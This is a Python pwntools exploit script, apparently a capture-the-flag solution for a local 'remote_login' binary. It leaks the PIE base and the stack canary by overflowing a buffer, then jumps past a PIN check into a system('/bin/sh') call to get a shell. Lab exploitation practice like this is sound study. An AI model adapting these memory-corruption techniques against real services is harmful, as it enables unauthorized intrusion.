from pwn import *

u64 = util.packing.u64
p64 = util.packing.p64


exe = ELF('./remote/remote_login')

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{{pane_pid}}', '-P']

def conn():
	if args.REMOTE:
		return remote('127.0.0.1', 1337)
	if args.GDB:
		return gdb.debug(exe.path, '''
			b *main
			continue
		''')
	return process(exe.path)


def main():
	r = conn()

	# PIE leak
	r.recvuntil(b'user_')
	main_leak = int(r.recvline().strip().decode(), 16)
	exe.address = main_leak - exe.sym['main']
	success(f'base address: {hex(exe.address)}')

	# Canary leak
	r.recvuntil(b'username: ')
	payload = cyclic(64 + 8)
	r.sendline(payload)
	r.recvuntil(b'Hello')
	r.recvline()
	canary = u64(b'\x00' + r.recv(7))
	success(f'canary: {hex(canary)}')

	# ret2win
	payload = flat(
		b'A' * 4, # pin
		payload, # username
		canary, # canary
		b'A' * 8, # rbp
		exe.sym['check_pin'] + (0x136C - 0x134E), # puts("Access Granted"); system("/bin/sh");
	)
	r.recvline()
	r.sendline(payload)

	r.interactive()


if __name__ == '__main__':
	main()
